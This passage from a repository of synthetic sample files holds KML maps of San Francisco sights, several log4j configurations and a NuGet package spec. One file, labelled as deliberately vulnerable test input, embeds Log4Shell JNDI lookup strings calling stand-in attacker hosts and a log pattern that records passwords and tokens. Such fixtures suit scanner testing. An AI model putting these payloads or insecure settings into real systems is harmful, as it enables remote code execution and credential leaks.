            <SimpleData name="Price">0.00</SimpleData>
          </SchemaData>
        </ExtendedData>
        <Point>
          <coordinates>-122.4185,37.8023,0</coordinates>
        </Point>
      </Placemark>
    </Folder>
    
    <Folder>
      <name>Dining</name>
      <description>Notable restaurants and cafes</description>
      
      <Placemark>
        <name>Fisherman's Wharf</name>
        <description>Famous seafood dining area</description>
        <styleUrl>#restaurant-style</styleUrl>
        <ExtendedData>
          <SchemaData schemaUrl="#POI">
            <SimpleData name="Category">Restaurant District</SimpleData>
            <SimpleData name="Rating">3</SimpleData>
            <SimpleData name="Price">25.00</SimpleData>
          </SchemaData>
        </ExtendedData>
        <Point>
          <coordinates>-122.4177,37.8080,0</coordinates>
        </Point>
      </Placemark>
    </Folder>
    
    <GroundOverlay>
      <name>SF Tourism Map</name>
      <description>Tourist map overlay</description>
      <Icon>
        <href>https://example.com/sf-map.png</href>
      </Icon>
      <LatLonBox>
        <north>37.8500</north>
        <south>37.7000</south>
        <east>-122.3500</east>
        <west>-122.5500</west>
      </LatLonBox>
    </GroundOverlay>
    
    <NetworkLink>
      <name>Live Traffic Data</name>
      <description>Real-time traffic information</description>
      <Link>
        <href>https://example.com/traffic.kml</href>
        <refreshMode>onInterval</refreshMode>
        <refreshInterval>300</refreshInterval>
      </Link>
    </NetworkLink>
  </Document>
</kml>
</file>

<file path="sample_data/test_files_synthetic/small/kml/route_linestring.kml">
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <name>Route Example</name>
    <description>A route from Golden Gate Bridge to Lombard Street</description>
    
    <Style id="route-style">
      <LineStyle>
        <color>ff0099ff</color>
        <width>4</width>
      </LineStyle>
    </Style>
    
    <Placemark>
      <name>Scenic Route</name>
      <description>Beautiful route through San Francisco</description>
      <styleUrl>#route-style</styleUrl>
      <LineString>
        <tessellate>1</tessellate>
        <coordinates>
          -122.4783,37.8199,0
          -122.4744,37.8144,0
          -122.4699,37.8089,0
          -122.4658,37.8034,0
          -122.4185,37.8023,0
        </coordinates>
      </LineString>
    </Placemark>
  </Document>
</kml>
</file>

<file path="sample_data/test_files_synthetic/small/kml/san-francisco-tour.kml">
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2" 
     xmlns:gx="http://www.google.com/kml/ext/2.2"
     xmlns:kml="http://www.opengis.net/kml/2.2" 
     xmlns:atom="http://www.w3.org/2005/Atom">

  <Document>
    <name>San Francisco Bay Area Tour</name>
    <description><![CDATA[
      A comprehensive tour of notable locations in the San Francisco Bay Area,
      including landmarks, hiking trails, and geographic features.
    ]]></description>
    
    <open>1</open>
    
    <!-- Document-level styles -->
    <Style id="landmark-style">
      <IconStyle>
        <color>ff0000ff</color>
        <scale>1.2</scale>
        <Icon>
          <href>http://maps.google.com/mapfiles/kml/pushpin/red-pushpin.png</href>
        </Icon>
        <hotSpot x="20" y="2" xunits="pixels" yunits="pixels"/>
      </IconStyle>
      <LabelStyle>
        <color>ff0000ff</color>
        <scale>1.1</scale>
      </LabelStyle>
    </Style>
    
    <Style id="trail-style">
      <LineStyle>
        <color>7f00ff00</color>
        <width>4</width>
      </LineStyle>
      <PolyStyle>
        <color>7f00ff00</color>
      </PolyStyle>
    </Style>
    
    <Style id="area-style">
      <LineStyle>
        <color>ff0099ff</color>
        <width>2</width>
      </LineStyle>
      <PolyStyle>
        <color>7f0099ff</color>
      </PolyStyle>
    </Style>
    
    <StyleMap id="highlight-style">
      <Pair>
        <key>normal</key>
        <styleUrl>#landmark-style</styleUrl>
      </Pair>
      <Pair>
        <key>highlight</key>
        <Style>
          <IconStyle>
            <color>ff00ffff</color>
            <scale>1.4</scale>
            <Icon>
              <href>http://maps.google.com/mapfiles/kml/pushpin/yellow-pushpin.png</href>
            </Icon>
          </IconStyle>
        </Style>
      </Pair>
    </StyleMap>

    <!-- Folder for landmarks -->
    <Folder>
      <name>San Francisco Landmarks</name>
      <description>Famous landmarks and points of interest</description>
      <open>1</open>

      <!-- Golden Gate Bridge -->
      <Placemark>
        <name>Golden Gate Bridge</name>
        <description><![CDATA[
          <p>The Golden Gate Bridge is a suspension bridge spanning the Golden Gate, 
          the one-mile-wide strait connecting San Francisco Bay and the Pacific Ocean.</p>
          <p><b>Opened:</b> May 27, 1937<br/>
          <b>Length:</b> 2,737 m (8,980 ft)<br/>
          <b>Height:</b> 227 m (746 ft)</p>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/GoldenGateBridge-001.jpg/320px-GoldenGateBridge-001.jpg" width="300"/>
        ]]></description>
        <styleUrl>#highlight-style</styleUrl>
        <Point>
          <coordinates>-122.4786,37.8199,0</coordinates>
        </Point>
      </Placemark>

      <!-- Alcatraz Island -->
      <Placemark>
        <name>Alcatraz Island</name>
        <description><![CDATA[
          <p>Alcatraz Island is located in San Francisco Bay, 1.25 miles offshore from San Francisco. 
          The island was the site of a federal prison from 1934 to 1963.</p>
          <p><b>Area:</b> 89,000 m² (22 acres)<br/>
          <b>Highest point:</b> 41 m (135 ft)</p>
        ]]></description>
        <styleUrl>#landmark-style</styleUrl>
        <Point>
          <extrude>1</extrude>
          <altitudeMode>relativeToGround</altitudeMode>
          <coordinates>-122.4230,37.8270,41</coordinates>
        </Point>
      </Placemark>

      <!-- Lombard Street -->
      <Placemark>
        <name>Lombard Street (Crookedest Street)</name>
        <description>Known as the "crookedest street in the world"</description>
        <styleUrl>#landmark-style</styleUrl>
        <Point>
          <coordinates>-122.4194,37.8021,0</coordinates>
        </Point>
      </Placemark>
    </Folder>

    <!-- Folder for trails and paths -->
    <Folder>
      <name>Hiking Trails</name>
      <description>Popular hiking trails in the Bay Area</description>
      <open>0</open>

      <!-- Golden Gate Bridge to Sausalito trail -->
      <Placemark>
        <name>Golden Gate Bridge to Sausalito</name>
        <description>A scenic walk/bike path across the Golden Gate Bridge to Sausalito</description>
        <styleUrl>#trail-style</styleUrl>
        <LineString>
          <extrude>1</extrude>
          <tessellate>1</tessellate>
          <altitudeMode>clampToGround</altitudeMode>
          <coordinates>
            -122.4786,37.8199,0
            -122.4800,37.8220,0
            -122.4850,37.8250,0
            -122.4900,37.8280,0
            -122.4950,37.8300,0
            -122.5000,37.8320,0
            -122.5050,37.8340,0
            -122.5085,37.8590,0
          </coordinates>
        </LineString>
      </Placemark>

      <!-- Marin Headlands Trail -->
      <Placemark>
        <name>Marin Headlands Coastal Trail</name>
        <description>Scenic coastal trail with views of San Francisco</description>
        <styleUrl>#trail-style</styleUrl>
        <gx:Track>
          <altitudeMode>absolute</altitudeMode>
          <gx:coord>-122.4950 37.8320 100</gx:coord>
          <gx:coord>-122.4955 37.8325 110</gx:coord>
          <gx:coord>-122.4960 37.8330 120</gx:coord>
          <gx:coord>-122.4965 37.8335 130</gx:coord>
          <gx:coord>-122.4970 37.8340 140</gx:coord>
          <gx:coord>-122.4975 37.8345 150</gx:coord>
          <gx:coord>-122.4980 37.8350 160</gx:coord>
          <gx:coord>-122.4985 37.8355 170</gx:coord>
        </gx:Track>
      </Placemark>
    </Folder>

    <!-- Folder for geographic areas -->
    <Folder>
      <name>Geographic Areas</name>
      <description>Protected areas and parks</description>
      <open>0</open>

      <!-- Golden Gate Park boundary -->
      <Placemark>
        <name>Golden Gate Park</name>
        <description>Large urban park in San Francisco</description>
        <styleUrl>#area-style</styleUrl>
        <Polygon>
          <extrude>1</extrude>
          <altitudeMode>relativeToGround</altitudeMode>
          <outerBoundaryIs>
            <LinearRing>
              <coordinates>
                -122.5108,37.7694,0
                -122.4550,37.7694,0
                -122.4550,37.7849,0
                -122.5108,37.7849,0
                -122.5108,37.7694,0
              </coordinates>
            </LinearRing>
          </outerBoundaryIs>
        </Polygon>
      </Placemark>

      <!-- San Francisco Bay -->
      <Placemark>
        <name>San Francisco Bay</name>
        <description>Large shallow estuary in Northern California</description>
        <styleUrl>#area-style</styleUrl>
        <MultiGeometry>
          <Polygon>
            <outerBoundaryIs>
              <LinearRing>
                <coordinates>
                  -122.5150,37.7000,0
                  -122.3000,37.7000,0
                  -122.3000,37.9000,0
                  -122.5150,37.9000,0
                  -122.5150,37.7000,0
                </coordinates>
              </LinearRing>
            </outerBoundaryIs>
            <!-- Inner boundary (island) -->
            <innerBoundaryIs>
              <LinearRing>
                <coordinates>
                  -122.4280,37.8220,0
                  -122.4180,37.8220,0
                  -122.4180,37.8320,0
                  -122.4280,37.8320,0
                  -122.4280,37.8220,0
                </coordinates>
              </LinearRing>
            </innerBoundaryIs>
          </Polygon>
        </MultiGeometry>
      </Placemark>
    </Folder>

    <!-- Network Links for dynamic content -->
    <NetworkLink>
      <name>Live Traffic Data</name>
      <description>Real-time traffic information</description>
      <refreshVisibility>0</refreshVisibility>
      <flyToView>0</flyToView>
      <Link>
        <href>http://example.com/traffic.kml</href>
        <refreshMode>onInterval</refreshMode>
        <refreshInterval>300</refreshInterval>
      </Link>
    </NetworkLink>

    <!-- Ground Overlay -->
    <GroundOverlay>
      <name>Historical Map Overlay</name>
      <description>1906 San Francisco map overlay</description>
      <Icon>
        <href>http://example.com/sf-1906-map.png</href>
      </Icon>
      <LatLonBox>
        <north>37.8324</north>
        <south>37.7849</south>
        <east>-122.3959</east>
        <west>-122.5108</west>
        <rotation>0</rotation>
      </LatLonBox>
    </GroundOverlay>

    <!-- Screen Overlay -->
    <ScreenOverlay>
      <name>Navigation Legend</name>
      <Icon>
        <href>http://example.com/legend.png</href>
      </Icon>
      <overlayXY x="0" y="1" xunits="fraction" yunits="fraction"/>
      <screenXY x="0" y="1" xunits="fraction" yunits="fraction"/>
      <rotationXY x="0" y="0" xunits="fraction" yunits="fraction"/>
      <size x="200" y="150" xunits="pixels" yunits="pixels"/>
    </ScreenOverlay>

    <!-- Tour -->
    <gx:Tour>
      <name>Bay Area Flyover</name>
      <description>Aerial tour of San Francisco Bay Area highlights</description>
      <gx:Playlist>
        <gx:FlyTo>
          <gx:duration>3.0</gx:duration>
          <gx:flyToMode>smooth</gx:flyToMode>
          <LookAt>
            <longitude>-122.4786</longitude>
            <latitude>37.8199</latitude>
            <altitude>1000</altitude>
            <heading>0</heading>
            <tilt>45</tilt>
            <range>2000</range>
            <altitudeMode>absolute</altitudeMode>
          </LookAt>
        </gx:FlyTo>
        <gx:Wait>
          <gx:duration>2.0</gx:duration>
        </gx:Wait>
        <gx:FlyTo>
          <gx:duration>4.0</gx:duration>
          <gx:flyToMode>smooth</gx:flyToMode>
          <LookAt>
            <longitude>-122.4230</longitude>
            <latitude>37.8270</latitude>
            <altitude>500</altitude>
            <heading>90</heading>
            <tilt>60</tilt>
            <range>1500</range>
            <altitudeMode>absolute</altitudeMode>
          </LookAt>
        </gx:FlyTo>
      </gx:Playlist>
    </gx:Tour>

  </Document>
</kml>
</file>

<file path="sample_data/test_files_synthetic/small/kml/simple_placemark.kml">
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <name>Simple Placemark</name>
    <description>A basic KML file with a single placemark</description>
    
    <Style id="icon-style">
      <IconStyle>
        <color>ff0000ff</color>
        <scale>1.2</scale>
        <Icon>
          <href>http://maps.google.com/mapfiles/kml/shapes/star.png</href>
        </Icon>
      </IconStyle>
    </Style>
    
    <Placemark>
      <name>Golden Gate Bridge</name>
      <description>Famous suspension bridge in San Francisco</description>
      <styleUrl>#icon-style</styleUrl>
      <Point>
        <coordinates>-122.4783,37.8199,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>
</file>

<file path="sample_data/test_files_synthetic/small/log4j/log4j.xml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE log4j:configuration SYSTEM "log4j.dtd">
<log4j:configuration xmlns:log4j="http://jakarta.apache.org/log4j/" debug="false" threshold="INFO">
    
    <!-- Console Appender -->
    <appender name="console" class="org.apache.log4j.ConsoleAppender">
        <param name="Target" value="System.out"/>
        <layout class="org.apache.log4j.PatternLayout">
            <param name="ConversionPattern" value="%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n"/>
        </layout>
    </appender>
    
    <!-- File Appender -->
    <appender name="fileAppender" class="org.apache.log4j.FileAppender">
        <param name="File" value="/var/log/myapp/application.log"/>
        <param name="Append" value="true"/>
        <layout class="org.apache.log4j.PatternLayout">
            <param name="ConversionPattern" value="%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n"/>
        </layout>
    </appender>
    
    <!-- Rolling File Appender -->
    <appender name="rollingFile" class="org.apache.log4j.RollingFileAppender">
        <param name="File" value="/var/log/myapp/rolling.log"/>
        <param name="MaxFileSize" value="10MB"/>
        <param name="MaxBackupIndex" value="5"/>
        <param name="Append" value="true"/>
        <layout class="org.apache.log4j.PatternLayout">
            <param name="ConversionPattern" value="%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n"/>
        </layout>
    </appender>
    
    <!-- Daily Rolling File Appender -->
    <appender name="dailyRollingFile" class="org.apache.log4j.DailyRollingFileAppender">
        <param name="File" value="/var/log/myapp/daily.log"/>
        <param name="DatePattern" value="'.'yyyy-MM-dd"/>
        <param name="Append" value="true"/>
        <layout class="org.apache.log4j.PatternLayout">
            <param name="ConversionPattern" value="%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1} - %m%n"/>
        </layout>
    </appender>
    
    <!-- Socket Appender (Security Risk) -->
    <appender name="socketAppender" class="org.apache.log4j.net.SocketAppender">
        <param name="RemoteHost" value="log-server.internal.com"/>
        <param name="Port" value="4560"/>
        <param name="LocationInfo" value="true"/>
    </appender>
    
    <!-- Async Appender -->
    <appender name="asyncAppender" class="org.apache.log4j.AsyncAppender">
        <param name="BufferSize" value="256"/>
        <appender-ref ref="rollingFile"/>
    </appender>
    
    <!-- Package-specific Loggers -->
    <logger name="com.example.security" additivity="false">
        <level value="DEBUG"/>
        <appender-ref ref="fileAppender"/>
        <appender-ref ref="console"/>
    </logger>
    
    <logger name="com.example.database" additivity="true">
        <level value="WARN"/>
        <appender-ref ref="rollingFile"/>
    </logger>
    
    <!-- Third-party Library Loggers -->
    <logger name="org.springframework" additivity="false">
        <level value="INFO"/>
        <appender-ref ref="dailyRollingFile"/>
    </logger>
    
    <logger name="org.hibernate.SQL" additivity="false">
        <level value="DEBUG"/>
        <appender-ref ref="fileAppender"/>
    </logger>
    
    <!-- High-frequency Logger with Async -->
    <logger name="com.example.performance" additivity="false">
        <level value="INFO"/>
        <appender-ref ref="asyncAppender"/>
    </logger>
    
    <!-- Root Logger -->
    <root>
        <level value="INFO"/>
        <appender-ref ref="console"/>
        <appender-ref ref="rollingFile"/>
        <appender-ref ref="socketAppender"/>
    </root>
    
</log4j:configuration>
</file>

<file path="sample_data/test_files_synthetic/small/log4j/log4j2-example.xml">
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="warn" packages="io.sentry.log4j2">
    <Properties>
        <Property name="LOG_PATTERN">%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n</Property>
        <Property name="FILE_LOG_PATTERN">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n</Property>
    </Properties>
    
    <Appenders>
        <!-- Console Appender -->
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Filters>
                <ThresholdFilter level="INFO"/>
            </Filters>
        </Console>
        
        <!-- File Appender -->
        <File name="FileAppender" fileName="logs/application.log" append="true">
            <PatternLayout pattern="${FILE_LOG_PATTERN}"/>
        </File>
        
        <!-- Rolling File Appender -->
        <RollingFile name="RollingFileAppender" 
                     fileName="logs/app.log"
                     filePattern="logs/app-%d{yyyy-MM-dd}.%i.log.gz">
            <PatternLayout pattern="${FILE_LOG_PATTERN}"/>
            <Policies>
                <TimeBasedTriggeringPolicy />
                <SizeBasedTriggeringPolicy size="10MB"/>
            </Policies>
            <DefaultRolloverStrategy max="5"/>
        </RollingFile>
        
        <!-- Sentry Appender for error tracking -->
        <Sentry name="Sentry"
                minimumBreadcrumbLevel="DEBUG"
                minimumEventLevel="WARN" />
    </Appenders>
    
    <Loggers>
        <!-- Application specific loggers -->
        <Logger name="com.example.app" level="DEBUG" additivity="false">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="RollingFileAppender"/>
        </Logger>
        
        <!-- Third party library loggers -->
        <Logger name="org.springframework" level="INFO" additivity="false">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="FileAppender"/>
        </Logger>
        
        <Logger name="org.hibernate" level="WARN" additivity="false">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="FileAppender"/>
        </Logger>
        
        <!-- Root logger -->
        <Root level="INFO">
            <AppenderRef ref="Sentry"/>
            <AppenderRef ref="Console"/>
            <AppenderRef ref="RollingFileAppender"/>
        </Root>
    </Loggers>
</Configuration>
</file>

<file path="sample_data/test_files_synthetic/small/log4j/log4j2-vulnerable.xml">
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="ERROR" monitorInterval="60">
    
    <Properties>
        <!-- VULNERABLE: Contains JNDI lookup (Log4Shell) -->
        <Property name="APP_NAME">${jndi:ldap://evil.server.com/app}</Property>
        <Property name="LOG_PATTERN">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n</Property>
    </Properties>
    
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <!-- VULNERABLE: Pattern with JNDI lookup -->
            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - ${jndi:dns://attacker.com/} %msg%n"/>
        </Console>
        
        <File name="FileAppender" fileName="/tmp/app.log">
            <!-- PERFORMANCE ISSUE: Location info enabled -->
            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %C.%M(%F:%L) - %msg%n"/>
        </File>
        
        <!-- SECURITY RISK: Logs potentially sensitive data -->
        <RollingFile name="SecurityLogAppender" 
                     fileName="/var/log/security.log"
                     filePattern="/var/log/security-%d{yyyy-MM-dd}.log">
            <PatternLayout pattern="%d - User: %X{username} Password: %X{password} Token: %X{authToken} - %msg%n"/>
            <Policies>
                <TimeBasedTriggeringPolicy/>
            </Policies>
        </RollingFile>
        
    </Appenders>
    
    <Loggers>
        <!-- PROBLEMATIC: Too many DEBUG loggers for production -->
        <Logger name="com.example" level="DEBUG" additivity="false">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="FileAppender"/>
        </Logger>
        
        <Logger name="com.example.auth" level="TRACE" additivity="false">
            <AppenderRef ref="SecurityLogAppender"/>
        </Logger>
        
        <Logger name="org.springframework.security" level="DEBUG" additivity="false">
            <AppenderRef ref="SecurityLogAppender"/>
        </Logger>
        
        <!-- Root with DEBUG level (inappropriate for production) -->
        <Root level="DEBUG">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="FileAppender"/>
        </Root>
        
    </Loggers>
    
</Configuration>
</file>

<file path="sample_data/test_files_synthetic/small/log4j/log4j2.xml">
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN" monitorInterval="30" shutdownHook="disable">
    
    <Properties>
        <Property name="LOG_PATTERN">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n</Property>
        <Property name="LOG_DIR">/var/log/myapp</Property>
    </Properties>
    
    <Appenders>
        <!-- Console Appender -->
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <ThresholdFilter level="INFO" onMatch="ACCEPT" onMismatch="DENY"/>
        </Console>
        
        <!-- File Appender -->
        <File name="FileAppender" fileName="${LOG_DIR}/application.log">
            <PatternLayout pattern="${LOG_PATTERN}"/>
        </File>
        
        <!-- Rolling File Appender -->
        <RollingFile name="RollingFileAppender" 
                     fileName="${LOG_DIR}/app-rolling.log"
                     filePattern="${LOG_DIR}/app-rolling-%d{yyyy-MM-dd}-%i.log.gz">
            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
            <Policies>
                <TimeBasedTriggeringPolicy/>
                <SizeBasedTriggeringPolicy size="100MB"/>
            </Policies>
            <DefaultRolloverStrategy max="10"/>
        </RollingFile>
        
        <!-- Async Appender for Performance -->
        <AsyncAppender name="AsyncFileAppender" bufferSize="512">
            <AppenderRef ref="RollingFileAppender"/>
            <includeLocation>false</includeLocation>
        </AsyncAppender>
        
        <!-- Socket Appender (potential security concern) -->
        <Socket name="SocketAppender" host="log-server.example.com" port="9999">
            <PatternLayout pattern="${LOG_PATTERN}"/>
        </Socket>
        
        <!-- SMTP Appender for Errors -->
        <SMTP name="SMTPAppender" 
              subject="Application Error - ${hostName}"
              to="alerts@example.com"
              from="noreply@example.com"
              smtpHost="smtp.example.com"
              smtpPort="587"
              smtpUsername="alerts@example.com"
              smtpPassword="smtp_password"
              bufferSize="50">
            <ThresholdFilter level="ERROR" onMatch="ACCEPT" onMismatch="DENY"/>
            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </SMTP>
        
    </Appenders>
    
    <Loggers>
        <!-- Async Logger for Performance -->
        <AsyncLogger name="com.example.performance" level="INFO" additivity="false">
            <AppenderRef ref="AsyncFileAppender"/>
        </AsyncLogger>
        
        <!-- Package-specific Loggers -->
        <Logger name="com.example.security" level="DEBUG" additivity="false">
            <AppenderRef ref="FileAppender"/>
            <AppenderRef ref="Console"/>
        </Logger>
        
        <Logger name="com.example.database" level="WARN" additivity="true">
            <AppenderRef ref="RollingFileAppender"/>
        </Logger>
        
        <!-- Third-party Library Loggers -->
        <Logger name="org.springframework" level="INFO" additivity="false">
            <AppenderRef ref="FileAppender"/>
        </Logger>
        
        <Logger name="org.hibernate" level="WARN" additivity="false">
            <AppenderRef ref="FileAppender"/>
        </Logger>
        
        <!-- Root Logger -->
        <Root level="INFO">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="AsyncFileAppender"/>
            <AppenderRef ref="SMTPAppender"/>
        </Root>
        
    </Loggers>
    
</Configuration>
</file>

<file path="sample_data/test_files_synthetic/small/nuget/SampleLibrary.DataAccess.nuspec">
<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <!-- Required elements -->
    <id>SampleLibrary.DataAccess</id>
    <version>2.1.3</version>
    <description>A comprehensive data access library providing repository patterns, unit of work implementation, and database abstraction for .NET applications. Supports Entity Framework Core, Dapper, and ADO.NET with built-in caching and logging capabilities.</description>
    <authors>John Smith, Jane Doe</authors>
    
    <!-- Optional metadata elements -->
    <title>Sample Data Access Library</title>
    <owners>Example Corporation, Development Team</owners>
    <projectUrl>https://github.com/example-corp/sample-library-dataaccess</projectUrl>
    <licenseUrl>https://github.com/example-corp/sample-library-dataaccess/blob/main/LICENSE</licenseUrl>
    <iconUrl>https://raw.githubusercontent.com/example-corp/sample-library-dataaccess/main/icon.png</iconUrl>
    <icon>icon.png</icon>
    <requireLicenseAcceptance>false</requireLicenseAcceptance>
    <developmentDependency>false</developmentDependency>
    <summary>High-performance data access library with repository pattern and caching support</summary>
    <copyright>Copyright © 2025 Example Corporation. All rights reserved.</copyright>
    <language>en-US</language>
    <tags>data-access repository entity-framework dapper orm database cache logging dotnet csharp</tags>
    <releaseNotes><![CDATA[
### Version 2.1.3 Release Notes

#### New Features
- Added support for .NET 8.0 target framework
- Implemented async/await patterns for all repository methods
- Added distributed caching support with Redis integration
- New query optimization features for complex LINQ expressions

#### Improvements
- Enhanced logging with structured logging support (Serilog integration)
- Improved connection pooling and resource management
- Better exception handling with custom exception types
- Updated Entity Framework Core to version 8.0.1

#### Bug Fixes
- Fixed memory leak in connection management
- Resolved thread safety issues in cached repositories
- Fixed null reference exceptions in edge cases
- Corrected transaction handling in nested operations

#### Breaking Changes
- Removed deprecated ILegacyRepository interface
- Changed constructor parameters for CachedRepository class
- Updated minimum .NET version requirement to .NET 6.0

#### Dependencies Updated
- Microsoft.EntityFrameworkCore: 8.0.1
- Dapper: 2.1.28
- Microsoft.Extensions.Caching.StackExchangeRedis: 8.0.1
- Serilog: 3.1.1
    ]]></releaseNotes>
    <repository type="git" url="https://github.com/example-corp/sample-library-dataaccess.git" branch="main" commit="a1b2c3d4e5f6789012345678901234567890abcd"/>
    <readme>README.md</readme>
    <packageTypes>
      <packageType name="Dependency"/>
    </packageTypes>
    
    <!-- Dependencies for different target frameworks -->
    <dependencies>
      <group targetFramework=".NETFramework4.8">
        <dependency id="Microsoft.EntityFrameworkCore" version="[3.1.32,4.0)" exclude="Build,Analyzers"/>
        <dependency id="Dapper" version="[2.0.123,3.0)" />
        <dependency id="System.Data.SqlClient" version="[4.8.5,5.0)" />
        <dependency id="Microsoft.Extensions.Logging.Abstractions" version="[3.1.32,4.0)" />
        <dependency id="Microsoft.Extensions.Caching.Abstractions" version="[3.1.32,4.0)" />
        <dependency id="Newtonsoft.Json" version="[13.0.3,14.0)" />
      </group>
      
      <group targetFramework=".NETCoreApp3.1">
        <dependency id="Microsoft.EntityFrameworkCore" version="[3.1.32,4.0)" exclude="Build,Analyzers"/>
        <dependency id="Microsoft.EntityFrameworkCore.SqlServer" version="[3.1.32,4.0)" />
        <dependency id="Dapper" version="[2.0.123,3.0)" />
        <dependency id="Microsoft.Extensions.Logging.Abstractions" version="[3.1.32,4.0)" />
        <dependency id="Microsoft.Extensions.Caching.Abstractions" version="[3.1.32,4.0)" />
        <dependency id="Microsoft.Extensions.Caching.Memory" version="[3.1.32,4.0)" />
        <dependency id="System.Text.Json" version="[4.7.2,5.0)" />
      </group>
      
      <group targetFramework="net6.0">
        <dependency id="Microsoft.EntityFrameworkCore" version="[6.0.25,7.0)" exclude="Build,Analyzers"/>
        <dependency id="Microsoft.EntityFrameworkCore.SqlServer" version="[6.0.25,7.0)" />
        <dependency id="Microsoft.EntityFrameworkCore.InMemory" version="[6.0.25,7.0)" />
        <dependency id="Dapper" version="[2.1.24,3.0)" />
        <dependency id="Microsoft.Extensions.Logging.Abstractions" version="[6.0.4,7.0)" />
        <dependency id="Microsoft.Extensions.Caching.Abstractions" version="[6.0.0,7.0)" />
        <dependency id="Microsoft.Extensions.Caching.Memory" version="[6.0.1,7.0)" />
        <dependency id="Microsoft.Extensions.Caching.StackExchangeRedis" version="[6.0.16,7.0)" />
        <dependency id="Serilog.Extensions.Logging" version="[3.1.0,4.0)" />
      </group>
      
      <group targetFramework="net8.0">
        <dependency id="Microsoft.EntityFrameworkCore" version="[8.0.1,9.0)" exclude="Build,Analyzers"/>
        <dependency id="Microsoft.EntityFrameworkCore.SqlServer" version="[8.0.1,9.0)" />
        <dependency id="Microsoft.EntityFrameworkCore.InMemory" version="[8.0.1,9.0)" />
        <dependency id="Microsoft.EntityFrameworkCore.Design" version="[8.0.1,9.0)" />
        <dependency id="Dapper" version="[2.1.28,3.0)" />
        <dependency id="Microsoft.Extensions.Logging.Abstractions" version="[8.0.0,9.0)" />
        <dependency id="Microsoft.Extensions.Caching.Abstractions" version="[8.0.0,9.0)" />
        <dependency id="Microsoft.Extensions.Caching.Memory" version="[8.0.0,9.0)" />
        <dependency id="Microsoft.Extensions.Caching.StackExchangeRedis" version="[8.0.1,9.0)" />
        <dependency id="Microsoft.Extensions.DependencyInjection.Abstractions" version="[8.0.0,9.0)" />
        <dependency id="Serilog.Extensions.Logging" version="[8.0.0,9.0)" />
        <dependency id="System.ComponentModel.Annotations" version="[5.0.0,6.0)" />
      </group>
    </dependencies>
    
    <!-- Framework references for specific target frameworks -->
    <frameworkReferences>
      <group targetFramework="net6.0">
        <frameworkReference name="Microsoft.AspNetCore.App" />
      </group>
      <group targetFramework="net8.0">
        <frameworkReference name="Microsoft.AspNetCore.App" />
      </group>
    </frameworkReferences>
    
    <!-- Content files for inclusion in consuming projects -->
    <contentFiles>
      <files include="content/app.config.transform" buildAction="None" copyToOutput="false" flatten="false"/>
      <files include="content/web.config.transform" buildAction="None" copyToOutput="false" flatten="false"/>
      <files include="contentFiles/cs/any/DataAccess/IRepository.cs" buildAction="Compile" copyToOutput="false" flatten="false"/>
      <files include="contentFiles/cs/any/DataAccess/BaseRepository.cs" buildAction="Compile" copyToOutput="false" flatten="false"/>
    </contentFiles>
  </metadata>
  
  <!-- Files to include in the package -->
  <files>
    <!-- Library assemblies for different target frameworks -->
    <file src="bin\Release\net48\SampleLibrary.DataAccess.dll" target="lib\net48\SampleLibrary.DataAccess.dll" />
    <file src="bin\Release\net48\SampleLibrary.DataAccess.pdb" target="lib\net48\SampleLibrary.DataAccess.pdb" />
    <file src="bin\Release\net48\SampleLibrary.DataAccess.xml" target="lib\net48\SampleLibrary.DataAccess.xml" />
    
    <file src="bin\Release\netcoreapp3.1\SampleLibrary.DataAccess.dll" target="lib\netcoreapp3.1\SampleLibrary.DataAccess.dll" />
    <file src="bin\Release\netcoreapp3.1\SampleLibrary.DataAccess.pdb" target="lib\netcoreapp3.1\SampleLibrary.DataAccess.pdb" />
    <file src="bin\Release\netcoreapp3.1\SampleLibrary.DataAccess.xml" target="lib\netcoreapp3.1\SampleLibrary.DataAccess.xml" />
    
    <file src="bin\Release\net6.0\SampleLibrary.DataAccess.dll" target="lib\net6.0\SampleLibrary.DataAccess.dll" />
    <file src="bin\Release\net6.0\SampleLibrary.DataAccess.pdb" target="lib\net6.0\SampleLibrary.DataAccess.pdb" />
    <file src="bin\Release\net6.0\SampleLibrary.DataAccess.xml" target="lib\net6.0\SampleLibrary.DataAccess.xml" />
    
    <file src="bin\Release\net8.0\SampleLibrary.DataAccess.dll" target="lib\net8.0\SampleLibrary.DataAccess.dll" />
